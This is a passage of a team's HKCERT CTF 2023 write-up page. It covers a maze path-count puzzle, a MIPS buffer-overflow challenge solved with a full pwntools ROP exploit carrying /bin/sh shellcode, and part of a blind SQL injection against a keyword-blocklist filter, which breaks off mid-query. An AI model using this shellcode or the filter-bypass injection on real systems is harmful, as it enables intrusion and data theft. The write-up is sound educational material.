<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><link rel=stylesheet href=/markdown.css><link rel=stylesheet href=/highlight.css><title>HKCERT 2023 | CTF Writeups</title>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js crossorigin=anonymous></script><script>window.onload=()=>renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]})</script></head><body><article class=container><h1 id=hkcert-ctf-2023-writeups>HKCERT CTF 2023 Writeups</h1><p>“looks like we’re keeping the 3rd place”</p><p><em>*goes to sleep*</em></p><p>Meanwhile the scoreboard:</p><figure><img src=/hkcert/Bk365ZgN6.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><figure><img src=/hkcert/HkHGYQgE6.gif alt=ez><figcaption aria-hidden=true>ez</figcaption></figure><h2 id=hackforces-gldanoob-degendemolisher>Hackforces (gldanoob,
degendemolisher)</h2><p>http://chal./hkcert23.pwnable.hk:28134/</p><p>No, we’re not going to solve a Codeforces problem, but instead we’re
given a submission attempt for a certain problem, and the goal is to
craft a valid input to break the submission program, i.e. to make it
either run into an error or yield incorrect results.</p><h3 id=what-were-given>What we’re given</h3><p>In essence, the Codeforces problem involves a maze in which the
player can only move right or down, and the submission program has to
output the total count of reachable cells, along with the number of
possible ways <span class="math inline">\(c_{i,j}\)</span> , modulo
<span class="math inline">\(1000000007\)</span> , to get to each cell in
the map. For example, if the map looks like</p><pre><code>...
x..</code></pre><p>then there are 2 ways, involving only → and ↓ moves, to get to the
bottom right <span class="math inline">\((1, 2)\)</span> from the top
left <span class="math inline">\((0, 0)\)</span>. The <code>x</code>
represents an obstacle that blocks the player.</p><p>This is what the map would look like if we replaced each reachable
cell with its possible path counts:</p><pre><code>111
x12</code></pre><p>Therefore the output should start with <code>5</code>, which is the
number of reachable cells, and contain the line <code>1 2 2</code>,
meaning there are 2 paths leading us to cell <span class="math inline">\((1, 2)\)</span>.</p><pre><code>Input:
2 3
...
x..

Output:
5
0 0 1
0 1 1
0 2 1
1 1 1
1 2 2</code></pre><p>Below is the provided submission code:</p><div class=sourceCode id=cb4><pre class="sourceCode c"><code class="sourceCode c"><span id=cb4-1><a href=#cb4-1 aria-hidden=true tabindex=-1></a><span class=pp>#include </span><span class=im>&lt;stdio.h&gt;</span></span>
<span id=cb4-2><a href=#cb4-2 aria-hidden=true tabindex=-1></a><span class=pp>#include </span><span class=im>&lt;string.h&gt;</span></span>
<span id=cb4-3><a href=#cb4-3 aria-hidden=true tabindex=-1></a><span class=pp>#define N </span><span class=dv>102</span></span>
<span id=cb4-4><a href=#cb4-4 aria-hidden=true tabindex=-1></a><span class=pp>#define MOD </span><span class=dv>1000000007</span></span>
<span id=cb4-5><a href=#cb4-5 aria-hidden=true tabindex=-1></a></span>
<span id=cb4-6><a href=#cb4-6 aria-hidden=true tabindex=-1></a><span class=dt>int</span> main <span class=op>()</span> <span class=op>{</span></span>
<span id=cb4-7><a href=#cb4-7 aria-hidden=true tabindex=-1></a>    <span class=dt>int</span> m<span class=op>,</span> n<span class=op>;</span></span>
<span id=cb4-8><a href=#cb4-8 aria-hidden=true tabindex=-1></a>    <span class=dt>char</span> a<span class=op>[</span>N<span class=op>][</span>N<span class=op>];</span></span>
<span id=cb4-9><a href=#cb4-9 aria-hidden=true tabindex=-1></a>    <span class=dt>int</span> dp<span class=op>[</span>N<span class=op>][</span>N<span class=op>];</span></span>
<span id=cb4-10><a href=#cb4-10 aria-hidden=true tabindex=-1></a></span>
<span id=cb4-11><a href=#cb4-11 aria-hidden=true tabindex=-1></a>    memset<span class=op>(</span>dp<span class=op>,</span> <span class=dv>0</span><span class=op>,</span> <span class=kw>sizeof</span> dp<span class=op>);</span></span>
<span id=cb4-12><a href=#cb4-12 aria-hidden=true tabindex=-1></a></span>
<span id=cb4-13><a href=#cb4-13 aria-hidden=true tabindex=-1></a>    scanf<span class=op>(</span><span class=st>&quot;</span><span class=sc>%d</span><span class=st> </span><span class=sc>%d\n</span><span class=st>&quot;</span><span class=op>,</span> <span class=op>&amp;</span>m<span class=op>,</span> <span class=op>&amp;</span>n<span class=op>);</span></span>
<span id=cb4-14><a href=#cb4-14 aria-hidden=true tabindex=-1></a>    <span class=cf>for</span> <span class=op>(</span><span class=dt>int</span> i <span class=op>=</span> <span class=dv>0</span><span class=op>;</span> i <span class=op>&lt;</span> m<span class=op>;</span> i<span class=op>++)</span> <span class=op>{</span></span>
<span id=cb4-15><a href=#cb4-15 aria-hidden=true tabindex=-1></a>        scanf<span class=op>(</span><span class=st>&quot;</span><span class=sc>%s</span><span class=st>&quot;</span><span class=op>,</span> a<span class=op>[</span>i<span class=op>]);</span></span>
<span id=cb4-16><a href=#cb4-16 aria-hidden=true tabindex=-1></a>    <span class=op>}</span></span>
<span id=cb4-17><a href=#cb4-17 aria-hidden=true tabindex=-1></a></span>
<span id=cb4-18><a href=#cb4-18 aria-hidden=true tabindex=-1></a>    <span class=dt>int</span> non_zero_count <span class=op>=</span> <span class=dv>0</span><span class=op>;</span></span>
<span id=cb4-19><a href=#cb4-19 aria-hidden=true tabindex=-1></a></span>
<span id=cb4-20><a href=#cb4-20 aria-hidden=true tabindex=-1></a>    dp<span class=op>[</span><span class=dv>0</span><span class=op>][</span><span class=dv>0</span><span class=op>]</span> <span class=op>=</span> a<span class=op>[</span><span class=dv>0</span><span class=op>][</span><span class=dv>0</span><span class=op>]</span> <span class=op>!=</span> <span class=ch>&#39;x&#39;</span> <span class=op>?</span> <span class=dv>1</span> <span class=op>:</span> <span class=dv>0</span><span class=op>;</span></span>
<span id=cb4-21><a href=#cb4-21 aria-hidden=true tabindex=-1></a>    <span class=cf>for</span> <span class=op>(</span><span class=dt>int</span> i <span class=op>=</span> <span class=dv>0</span><span class=op>;</span> i <span class=op>&lt;</span> m<span class=op>;</span> i<span class=op>++)</span> <span class=op>{</span></span>
<span id=cb4-22><a href=#cb4-22 aria-hidden=true tabindex=-1></a>        <span class=cf>for</span> <span class=op>(</span><span class=dt>int</span> j <span class=op>=</span> <span class=dv>0</span><span class=op>;</span> j <span class=op>&lt;</span> n<span class=op>;</span> j<span class=op>++)</span> <span class=op>{</span></span>
<span id=cb4-23><a href=#cb4-23 aria-hidden=true tabindex=-1></a>            <span class=cf>if</span> <span class=op>(</span>a<span class=op>[</span>i<span class=op>][</span>j<span class=op>]</span> <span class=op>==</span> <span class=ch>&#39;x&#39;</span><span class=op>)</span> <span class=cf>continue</span><span class=op>;</span></span>
<span id=cb4-24><a href=#cb4-24 aria-hidden=true tabindex=-1></a>            <span class=cf>if</span> <span class=op>(</span>i <span class=op>&gt;</span> <span class=dv>0</span><span class=op>)</span> dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>]</span> <span class=op>=</span> <span class=op>(</span>dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>]</span> <span class=op>+</span> dp<span class=op>[</span>i<span class=op>-</span><span class=dv>1</span><span class=op>][</span>j<span class=op>])</span> <span class=op>%</span> MOD<span class=op>;</span></span>
<span id=cb4-25><a href=#cb4-25 aria-hidden=true tabindex=-1></a>            <span class=cf>if</span> <span class=op>(</span>j <span class=op>&gt;</span> <span class=dv>0</span><span class=op>)</span> dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>]</span> <span class=op>=</span> <span class=op>(</span>dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>]</span> <span class=op>+</span> dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>-</span><span class=dv>1</span><span class=op>])</span> <span class=op>%</span> MOD<span class=op>;</span></span>
<span id=cb4-26><a href=#cb4-26 aria-hidden=true tabindex=-1></a>            <span class=cf>if</span> <span class=op>(</span>dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>])</span> non_zero_count <span class=op>+=</span> <span class=dv>1</span><span class=op>;</span></span>
<span id=cb4-27><a href=#cb4-27 aria-hidden=true tabindex=-1></a>        <span class=op>}</span></span>
<span id=cb4-28><a href=#cb4-28 aria-hidden=true tabindex=-1></a>    <span class=op>}</span></span>
<span id=cb4-29><a href=#cb4-29 aria-hidden=true tabindex=-1></a></span>
<span id=cb4-30><a href=#cb4-30 aria-hidden=true tabindex=-1></a>    printf<span class=op>(</span><span class=st>&quot;</span><span class=sc>%d\n</span><span class=st>&quot;</span><span class=op>,</span> non_zero_count<span class=op>);</span></span>
<span id=cb4-31><a href=#cb4-31 aria-hidden=true tabindex=-1></a>    <span class=cf>for</span> <span class=op>(</span><span class=dt>int</span> i <span class=op>=</span> <span class=dv>0</span><span class=op>;</span> i <span class=op>&lt;</span> m<span class=op>;</span> i<span class=op>++)</span></span>
<span id=cb4-32><a href=#cb4-32 aria-hidden=true tabindex=-1></a>        <span class=cf>for</span> <span class=op>(</span><span class=dt>int</span> j <span class=op>=</span> <span class=dv>0</span><span class=op>;</span> j <span class=op>&lt;</span> n<span class=op>;</span> j<span class=op>++)</span></span>
<span id=cb4-33><a href=#cb4-33 aria-hidden=true tabindex=-1></a>            <span class=cf>if</span> <span class=op>(</span>dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>]</span> <span class=op>&gt;</span> <span class=dv>0</span><span class=op>)</span></span>
<span id=cb4-34><a href=#cb4-34 aria-hidden=true tabindex=-1></a>                printf<span class=op>(</span><span class=st>&quot;</span><span class=sc>%d</span><span class=st> </span><span class=sc>%d</span><span class=st> </span><span class=sc>%d\n</span><span class=st>&quot;</span><span class=op>,</span> i<span class=op>,</span> j<span class=op>,</span> dp<span class=op>[</span>i<span class=op>][</span>j<span class=op>]);</span></span>
<span id=cb4-35><a href=#cb4-35 aria-hidden=true tabindex=-1></a><span class=op>}</span></span></code></pre></div><p><code>dp[i][j]</code> refers to the number of paths to cell <span class="math inline">\((i, j)\)</span>, and the nested for loop basically
sums the number of possible paths to the cells directly above and to the
left of the each cell <span class="math inline">\((i, j)\)</span> (you
can only get to a cell from the top or left) and assigns it to <span class="math inline">\(c_{i, j}\)</span> . In fact, it can be proved
using induction that this algorithm is indeed correct in computing <span class="math inline">\(c_{i, j}\)</span> for all cells.</p><h3 id=the-thought-process>The thought process</h3><p>So which part of the code <em>could</em> go wrong? Well, since <span class=citation data-cites=gldanoob>@gldanoob</span> did a lot of
pwning, he thought there would be a nuance buffer overflow of some sort.
It turned out we couldn’t overwrite data beyond the array boundaries,
without making our input invalid. The program also handles edge cases
really well (such as the cells on the map’s edges, or an <code>x</code>
on the starting cell).</p><p>The key is to notice how the program outputs the results. It checks
if <code>dp[i][j]</code> isn’t 0 and prints the line. But since
<code>dp[i][j]</code> holds <span class="math inline">\(c_{i, j}\mod
10^9+7\)</span>, the program would ignore the cell even if <span class="math inline">\(c_{i, j} = 10^9+7\)</span>, which is obviously not
zero. That entails if we can craft a map with the number of ways to get
to a paricular cell being <em>exactly</em> <span class="math inline">\(10^9+7\)</span>, the program will :collision:.</p><p>We tried to come up with ways to algorithmically generate maps
containing a cell with such a large path count. The first way involves
finding a cell with <span class="math inline">\(c_{i,j} \approx 10^9 +
7\)</span> in an empty <span class="math inline">\(100\times100\)</span>
map (<a href=https://en.wikipedia.org/wiki/Pascal%27s_triangle>in
which the path counts are just binomial coefficients</a>), and begin
adding obstacles near it to achieve the path count. Unfortunately the
target number is so large, we needed even more precise control of <span class="math inline">\(c_{i, j}\)</span> .</p><p>Eventually we found out how we could do basic arithmetic operations
on <span class="math inline">\(c_{i,j}\)</span> by merely adding
obstacles. For instance, in</p><pre><code>....A
...x.
..x..
.x...
B...C            (A, B, C represents empty cells)</code></pre><p>all paths to get to <code>C</code> are blocked, unless if they pass
through <code>A</code> or <code>B</code>. Therefore <span class="math inline">\(c_C = c_A + c_B\)</span>.</p><p>To multiply the path count of a cell <code>A</code> by 2, we can do
the following:</p><pre><code>..x
.A.
x.B</code></pre><p><span class="math inline">\(c_B = 2c_A\)</span> This works due to the
total of 2 ways to get to B <em>after</em> getting to A.</p><h3 id=our-solution>Our solution</h3><p>Since we are able to construct <span class="math inline">\(c_C =
2c_A\)</span> and <span class="math inline">\(c_C = c_A + c_B\)</span>
from <code>A</code> and <code>B</code>: 1. Write <span class="math inline">\(10^9+7\)</span> in binary and figure out the
powers of two we need to add up: <span class="math inline">\(10^9+7 =
2^0 + 2^1 + 2^2 +
2^9+2^{11}+2^{14}+2^{15}+2^{17}+2^{19}+2^{20}+2^{23}+2^{24}+2^{25}
+2^{27} +2^{28} +2^{29}\)</span> 2. In the map, start with <span class="math inline">\(c_A = 1\)</span>, and generate path counts with
the required powers of two using the second trick above 3.
<em>Bring</em> the path counts together (with walls of obstacles) and
add them up to a cell</p><h3 id=map-we-created>Map we created:</h3><figure><img src=/hkcert/BkMrgUyEp.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><h2 id=mips-rop-gldanoob>mips rop (gldanoob)</h2><p>I thought this would be a fun challenge as I might learn about MIPS
but at the end it gave me eye strain :sob:</p><p>Attachment:
https://file./hkcert23.pwnable.hk/mips-rop_e2610ec1ddc37812e250b7ac17cadfe6.zip
<code>nc chal./hkcert23.pwnable.hk 28151</code></p><p><code>./rop</code> is MIPS binary containing a buffer overflow
vulnerability, and as the title suggests we had to write an exploit
using return-oriented programming to get us a shell and
<code>cat flag</code>.</p><p>In my case I used <code>gdb-multiarch</code> and <code>pwndbg</code>
as my debugger, and <code>qemu</code> to simulate the MIPS runtime.</p><h3 id=first-look>First look</h3><blockquote><p>“what is this minecraft enchanting table ahh language” - gldanoob</p></blockquote><figure><img src=/hkcert/H15G8LyVa.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>I recognized two calls to <code>puts</code> (corresponding to the
program’s output) and one to <code>gets</code>, which lets us overwrite
an unlimited number of bytes beyond a buffer on the stack (before
hitting the stack boundary).</p><p>Let’s run <code>checksec</code> first for a good measure:</p><figure><img src=/hkcert/HJF02kx4T.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>Great. No NX or PIE, which means we can directly inject shellcode
into the buffer without leaking an address from the stack via
<code>puts()</code>. <em>For some reason</em> although it has stack
protection enabled, the <code>main()</code> prolog and epilog doesn’t
seem to contain the corresponding code for stack canaries.</p><h3 id=its-more-than-just-pop-rdi>It’s more than just
<code>pop rdi</code></h3><p>Knowing absolutely nothing other than x86-64 pwning, I immediately
started googling and eventually came across this post:
https://ctftime.org/writeup/22613</p><p>Instead of chaining the return addresses of the ROP gadgets, like
what we do when exploiting an x86 binary, we have to either overwrite
<code>ra</code> or <code>t9</code> with our return address (depending on
whether the gadget ends with <code>jr $ra</code> or
<code>jalr $t9</code>), which makes thing harder as there are more
registers we have to control.</p><p>What’s even worse is that we can’t just overwrite <code>ra</code> or
<code>t9</code> with a custom address, as assumably ASLR is enabled on
the server and there’s no way to <em>guess</em> the address of our
buffer. Is there any pointer value on the stack we can utilize? <img src=/hkcert/ry74gge46.png alt=image></p><p>We observe that at the location <code>sp+0x1c</code>, there resides a
pointer to <code>sp</code> itself (<code>0x2b2aa7b0</code>), with the
current stack frame belonging to <code>__libc_start_main</code>. If we
can find a gadget that loads <code>[sp+0x1c]</code> into
<code>ra</code>, we can force the program to start executing code at
<code>sp</code> which is controllable by us.</p><p>Let’s begin searching for gadgets that look something like
<code>lw ra, 0x1c(sp)</code>:</p><figure><img src=/hkcert/Synk4geNp.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>Turns out there are lots of them which could do the trick (due to
most of them being a part of function epilogs and <a href=https://en.wikipedia.org/wiki/Static_library>static linking</a>).
I chose the one at <code>0x455748</code>.</p><p>(It’s actually not that easy - I spent hours to even find a useful
gadget)</p><p>One last thing, I couldn’t fit all my shellcode between
<code>sp</code> and <code>sp+0x1c</code>, so I would need to alter the
execution flow to a larger buffer. Here we could just <code>jr</code> to
the start of the <code>gets()</code> buffer (at <code>sp-0x50</code>)
and put our actual shellcode there.</p><p>Here’s what the stack looks like after the call to
<code>gets()</code> (and we injected our evil input):</p><pre><code>sp - 0x50  -&gt;    (shellcode padded to 0x4c bytes 😈)
...
sp - 4     -&gt;    (address to rop gadget)
sp         -&gt;    addiu $ra, $ra, -0x50
sp + 4     -&gt;    jr    $ra
...
sp + 0x1c  -&gt;    (value of sp)</code></pre><p>After the program exits <code>main()</code>, it loads the address of
our gadget into <code>ra</code> then executes it, which also loads
<code>sp</code> into <code>ra</code>. Our injected code at
<code>sp</code> then redirects the program to run our evil shellcode at
<code>sp-0x50</code>.</p><h3 id=solution>Solution</h3><div class=sourceCode id=cb8><pre class="sourceCode python"><code class="sourceCode python"><span id=cb8-1><a href=#cb8-1 aria-hidden=true tabindex=-1></a><span class=im>from</span> pwn <span class=im>import</span> <span class=op>*</span></span>
<span id=cb8-2><a href=#cb8-2 aria-hidden=true tabindex=-1></a></span>
<span id=cb8-3><a href=#cb8-3 aria-hidden=true tabindex=-1></a>context.update(arch<span class=op>=</span><span class=st>&#39;mips&#39;</span>, endian<span class=op>=</span><span class=st>&#39;big&#39;</span>, os<span class=op>=</span><span class=st>&#39;linux&#39;</span>, bits<span class=op>=</span><span class=dv>32</span>)</span>
<span id=cb8-4><a href=#cb8-4 aria-hidden=true tabindex=-1></a>r <span class=op>=</span> remote(<span class=st>&#39;chal./hkcert23.pwnable.hk&#39;</span>, <span class=dv>28151</span>)</span>
<span id=cb8-5><a href=#cb8-5 aria-hidden=true tabindex=-1></a>sh <span class=op>=</span> asm(<span class=st>&#39;&#39;&#39;</span></span>
<span id=cb8-6><a href=#cb8-6 aria-hidden=true tabindex=-1></a><span class=st>  lui $t7, 0x2f62</span></span>
<span id=cb8-7><a href=#cb8-7 aria-hidden=true tabindex=-1></a><span class=st>  ori $t7, $t7,0x696e</span></span>
<span id=cb8-8><a href=#cb8-8 aria-hidden=true tabindex=-1></a><span class=st>  lui $t6, 0x2f73</span></span>
<span id=cb8-9><a href=#cb8-9 aria-hidden=true tabindex=-1></a><span class=st>  ori $t6, $t6, 0x6800</span></span>
<span id=cb8-10><a href=#cb8-10 aria-hidden=true tabindex=-1></a><span class=st>  sw $t7, -12($sp)</span></span>
<span id=cb8-11><a href=#cb8-11 aria-hidden=true tabindex=-1></a><span class=st>  sw $t6, -8($sp)</span></span>
<span id=cb8-12><a href=#cb8-12 aria-hidden=true tabindex=-1></a><span class=st>  sw $zero, -4($sp)</span></span>
<span id=cb8-13><a href=#cb8-13 aria-hidden=true tabindex=-1></a><span class=st>  addiu $a0, $sp, -12</span></span>
<span id=cb8-14><a href=#cb8-14 aria-hidden=true tabindex=-1></a><span class=st>  slti $a1, $zero, -1</span></span>
<span id=cb8-15><a href=#cb8-15 aria-hidden=true tabindex=-1></a><span class=st>  slti $a2, $zero, -1</span></span>
<span id=cb8-16><a href=#cb8-16 aria-hidden=true tabindex=-1></a><span class=st>  li $v0, 4011</span></span>
<span id=cb8-17><a href=#cb8-17 aria-hidden=true tabindex=-1></a><span class=st>  syscall 0x040405</span></span>
<span id=cb8-18><a href=#cb8-18 aria-hidden=true tabindex=-1></a><span class=st>&#39;&#39;&#39;</span>)</span>
<span id=cb8-19><a href=#cb8-19 aria-hidden=true tabindex=-1></a></span>
<span id=cb8-20><a href=#cb8-20 aria-hidden=true tabindex=-1></a>gadget <span class=op>=</span> <span class=bn>0x455748</span></span>
<span id=cb8-21><a href=#cb8-21 aria-hidden=true tabindex=-1></a></span>
<span id=cb8-22><a href=#cb8-22 aria-hidden=true tabindex=-1></a>payload <span class=op>=</span> sh.ljust(<span class=bn>0x4c</span>, <span class=st>b&#39;</span><span class=ch>\x00</span><span class=st>&#39;</span>)</span>
<span id=cb8-23><a href=#cb8-23 aria-hidden=true tabindex=-1></a>payload <span class=op>+=</span> p32(gadget)</span>
<span id=cb8-24><a href=#cb8-24 aria-hidden=true tabindex=-1></a>payload <span class=op>+=</span> <span class=st>b&quot;</span><span class=ch>\x27\xff\xff\xb0\x03\xe0\x00\x08\x00\x00\x00\x00</span><span class=st>&quot;</span></span>
<span id=cb8-25><a href=#cb8-25 aria-hidden=true tabindex=-1></a>r.sendline(payload)</span>
<span id=cb8-26><a href=#cb8-26 aria-hidden=true tabindex=-1></a>r.interactive()</span></code></pre></div><figure><img src=/hkcert/SJfY4-lV6.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><h2 id=secret-notebook-gldanoob-degendemolisher-vow>Secret Notebook
(gldanoob, degendemolisher, vow)</h2><p>Just an average web app with password authentication and content
hosting. What could go wrong?</p><p>http://chal-a./hkcert23.pwnable.hk:28107/index</p><p>Attachment:
https://file./hkcert23.pwnable.hk/secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip</p><p>In the site, users can sign up and create public notes freely. They
can even retrieve a list of notes other users have written. The only
restriction though, is that the <code>Administrator</code> account has a
<em>secret note</em> stored in the same database, and is intended to be
non-readable by normal users other than the administrator. And, of
course, our goal is to retrieve it.</p><p>In short, the <code>users</code> table is structured like this:</p><pre class=csvpreview data-header=true><code>username,password,publicnote,secretnote
Administrator,???????,Welcome! I am admin and ...,/hkcert23{REDACTED}
amogos,???????,oi tudo bem?,NULL</code></pre><p>And whenever a user clicks <em>Retrieve Public Notes</em>, the
<code>username</code> and <code>publicnote</code> fields get selected
and here’s what gets returned to the user:</p><figure><img src=/hkcert/H1iV7MbNp.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><h3 id=sqli-real-estate>SQLi Real Estate…?</h3><p>Let’s look at the part of the code executing the query:</p><div class=sourceCode id=cb10><pre class="sourceCode python"><code class="sourceCode python"><span id=cb10-1><a href=#cb10-1 aria-hidden=true tabindex=-1></a><span class=kw>def</span> doGetPublicNotes(column, ascending):</span>
<span id=cb10-2><a href=#cb10-2 aria-hidden=true tabindex=-1></a>    connector <span class=op>=</span> getConnector()</span>
<span id=cb10-3><a href=#cb10-3 aria-hidden=true tabindex=-1></a>    cursor <span class=op>=</span> connector.cursor()</span>
<span id=cb10-4><a href=#cb10-4 aria-hidden=true tabindex=-1></a>    <span class=cf>if</span> column <span class=kw>and</span> <span class=kw>not</span> isInputValid(column):</span>
<span id=cb10-5><a href=#cb10-5 aria-hidden=true tabindex=-1></a>        abort(<span class=dv>403</span>)</span>
<span id=cb10-6><a href=#cb10-6 aria-hidden=true tabindex=-1></a>    <span class=cf>if</span> ascending  <span class=op>!=</span> <span class=st>&quot;ASC&quot;</span>:</span>
<span id=cb10-7><a href=#cb10-7 aria-hidden=true tabindex=-1></a>        ascending <span class=op>=</span> <span class=st>&quot;DESC&quot;</span></span>
<span id=cb10-8><a href=#cb10-8 aria-hidden=true tabindex=-1></a>    cursor.execute(<span class=ss>f&quot;SELECT username, publicnote FROM users ORDER BY </span><span class=sc>{</span>column<span class=sc>}</span><span class=ss> </span><span class=sc>{</span>ascending<span class=sc>}</span><span class=ss>;&quot;</span>)</span></code></pre></div><p>Wait. Did they just format the <code>column</code> and
<code>ascending</code> parameters into the query string? Instead of
letting the <code>mysql</code> module to prepare the query, the
developer used a custom filter function and just <em>inserts</em> the
params as they are into the query.</p><p>Here’s what the filter function does:</p><div class=sourceCode id=cb11><pre class="sourceCode python"><code class="sourceCode python"><span id=cb11-1><a href=#cb11-1 aria-hidden=true tabindex=-1></a><span class=kw>def</span> isInputValid(untrustedInput: <span class=bu>str</span>) <span class=op>-&gt;</span> <span class=bu>bool</span>:</span>
<span id=cb11-2><a href=#cb11-2 aria-hidden=true tabindex=-1></a>    <span class=cf>if</span> <span class=st>&quot;&#39;&quot;</span> <span class=kw>in</span> untrustedInput <span class=op>\</span></span>
<span id=cb11-3><a href=#cb11-3 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;</span><span class=ch>\&quot;</span><span class=st>&quot;</span> <span class=kw>in</span> untrustedInput <span class=op>\</span></span>
<span id=cb11-4><a href=#cb11-4 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;;&quot;</span>  <span class=kw>in</span> untrustedInput <span class=op>\</span></span>
<span id=cb11-5><a href=#cb11-5 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;/&quot;</span>  <span class=kw>in</span> untrustedInput <span class=op>\</span></span>
<span id=cb11-6><a href=#cb11-6 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;*&quot;</span>  <span class=kw>in</span> untrustedInput <span class=op>\</span></span>
<span id=cb11-7><a href=#cb11-7 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;-&quot;</span>  <span class=kw>in</span> untrustedInput <span class=op>\</span></span>
<span id=cb11-8><a href=#cb11-8 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;#&quot;</span>  <span class=kw>in</span> untrustedInput <span class=op>\</span></span>
<span id=cb11-9><a href=#cb11-9 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;select&quot;</span>  <span class=kw>in</span> untrustedInput.lower() <span class=op>\</span></span>
<span id=cb11-10><a href=#cb11-10 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;insert&quot;</span>  <span class=kw>in</span> untrustedInput.lower() <span class=op>\</span></span>
<span id=cb11-11><a href=#cb11-11 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;update&quot;</span>  <span class=kw>in</span> untrustedInput.lower() <span class=op>\</span></span>
<span id=cb11-12><a href=#cb11-12 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;delete&quot;</span>  <span class=kw>in</span> untrustedInput.lower() <span class=op>\</span></span>
<span id=cb11-13><a href=#cb11-13 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;where&quot;</span>  <span class=kw>in</span> untrustedInput.lower() <span class=op>\</span></span>
<span id=cb11-14><a href=#cb11-14 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;union&quot;</span>  <span class=kw>in</span> untrustedInput.lower() <span class=op>\</span></span>
<span id=cb11-15><a href=#cb11-15 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;sleep&quot;</span>  <span class=kw>in</span> untrustedInput.lower() <span class=op>\</span></span>
<span id=cb11-16><a href=#cb11-16 aria-hidden=true tabindex=-1></a>        <span class=kw>or</span> <span class=st>&quot;secretnote&quot;</span>  <span class=kw>in</span> untrustedInput.lower():</span>
<span id=cb11-17><a href=#cb11-17 aria-hidden=true tabindex=-1></a>        <span class=cf>return</span> <span class=va>False</span></span>
<span id=cb11-18><a href=#cb11-18 aria-hidden=true tabindex=-1></a>    <span class=cf>return</span> <span class=va>True</span></span></code></pre></div><p>It checks if the query has occurences of certain keywords and
symbols, and an HTTP 403 response is sent if the param doesn’t pass the
filter. And as you’ve probably guessed it, this sort of custom SQL
filters are <em>most likely</em> bypassable.</p><p>Let’s write down the SQL query that gets executed:</p><div class=sourceCode id=cb12><pre class="sourceCode sql"><code class="sourceCode sql"><span id=cb12-1><a href=#cb12-1 aria-hidden=true tabindex=-1></a><span class=kw>SELECT</span> username, publicnote <span class=kw>FROM</span> users <span class=kw>ORDER</span> <span class=kw>BY</span> {<span class=kw>column</span>} <span class=kw>ASC</span>;</span></code></pre></div><p>Since the <code>ascending</code> parameter could only be
<code>ASC</code> or <code>DESC</code>, we’ll just modify the
<code>column</code> param to achieve what we want.</p><p>Can we comment out the rest of the query? Nope. The filter blocks all
<code>--</code> and <code>#</code> comments. We couldn’t modify the
<code>WHERE</code> clause either, since our payload is inserted after
<code>ORDER BY</code>, and we can’t even have or put a
<code>WHERE</code> clause to begin with.</p><p>There’s a common SQL trick exploiting the fact that keywords are
case-insensitive. We can use a mix of upper and lowercase letters
(<code>wHeRe</code> for example) to bypass checks for <code>WHERE</code>
or <code>where</code>. Unfortunately that wouldn’t work in our case as
the filter calls the <code>.lower()</code> method on our payload before
checking.</p><p>How about adding a brand new SQL statement? Well, if the filter
permitted <code>UNION</code>, we’d be able to insert another query after
it. But as it is also blocked, our only choice is to do <strong>blind
SQL injection.</strong></p><h3 id=the-only-times-youd-want-an-error-in-your-code>The only times
you’d want an error in your code</h3><p><a href=https://www.geeksforgeeks.org/sql-subquery/>SQL
subqueries</a> allows flexible and dynamic query writing, however the
difference is that doesn’t get shown as a part of the query result. It
simply returns its values, like a function, to the main query.</p><p>For example if this was our query:</p><div class=sourceCode id=cb13><pre class="sourceCode sql"><code class="sourceCode sql"><span id=cb13-1><a href=#cb13-1 aria-hidden=true tabindex=-1></a><span class=kw>SELECT</span> username, publicnote <span class=kw>FROM</span> users <span class=kw>WHERE</span> username <span class=kw>IN</span> (<span class=kw>select</span> <span class=kw>password</span> <span class=kw>from</span> users);</span></code></pre></div><p>The subquery (<code>select password from users</code>) would just
create a temporary table, which helped the WHERE clause to determine if
the username was being used as someone’s password. The
<code>password</code> field wouldn’t be shown as a part of the
output.</p><p>In our case we’ll have to write subqueries in a much more restrictive
enviroment. Our query has to be after the <code>ORDER BY</code> clause
(which probably wouldn’t do much) and we couldn’t even use
<code>SELECT</code> to retrive any fields from the table.</p><p>Is it a dead end? No. There’s another clever trick which lets us
retrieve information from the database even <em>without</em> the
output.</p><div class=sourceCode id=cb14><pre class="sourceCode sql"><code class="sourceCode sql"><span id=cb14-1><a href=#cb14-1 aria-hidden=true tabindex=-1></a><span class=kw>SELECT</span> username, publicnote <span class=kw>FROM</span> users <span class=kw>ORDER</span> <span class=kw>BY</span> (</span>
